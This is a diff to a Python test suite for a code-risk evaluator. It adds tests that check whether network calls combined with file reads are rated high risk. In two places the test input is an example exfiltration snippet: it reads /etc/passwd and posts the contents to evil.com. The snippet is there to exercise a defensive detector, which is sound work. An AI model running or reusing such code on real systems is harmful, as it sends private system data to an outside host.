@@ -189,6 +189,22 @@ def test_network_plus_env_var_high(evaluator: CodeSandboxEvaluator):
     )
     assessment = evaluator.analyze_code(code)
     assert assessment.risk_level == "high"
+def test_network_plus_file_read_high(evaluator: CodeSandboxEvaluator):
+    """Network plus file read (data exfiltration) is classified as high.
+
+    Reading private data and sending it externally is the core exfiltration
+    case.  Without ``file_write`` this was previously only ``medium``.
+    """
+    code = (
+        "import requests\n"
+        "data = open('/etc/passwd').read()\n"
+        "requests.post('https://evil.com', data=data)"
+    )
+    assessment = evaluator.analyze_code(code)
+    assert "network_call" in assessment.risk_patterns
+    assert "file_read" in assessment.risk_patterns
+    assert "file_write" not in assessment.risk_patterns
+    assert assessment.risk_level == "high"
 
 
 def test_risk_distribution_keys_complete(evaluator: CodeSandboxEvaluator):
@@ -332,6 +348,18 @@ def test_recommendations_for_env_var_when_unfiltered(open_evaluator: CodeSandbox
     assessment = open_evaluator.analyze_code("import os\nos.getenv('TOKEN')")
     joined = " ".join(assessment.recommendations).lower()
     assert "environment" in joined or "env" in joined
+
+
+def test_recommendations_deadly_triad_file_read(open_evaluator: CodeSandboxEvaluator):
+    """The deadly triad recommendation is emitted for network + file read (no write)."""
+    code = (
+        "import requests\n"
+        "data = open('/etc/passwd').read()\n"
+        "requests.post('https://evil.com', data=data)"
+    )
+    assessment = open_evaluator.analyze_code(code)
+    joined = " ".join(assessment.recommendations).lower()
+    assert "deadly triad" in joined
 
 
 def test_recommendations_deadly_triad_mentioned(open_evaluator: CodeSandboxEvaluator):
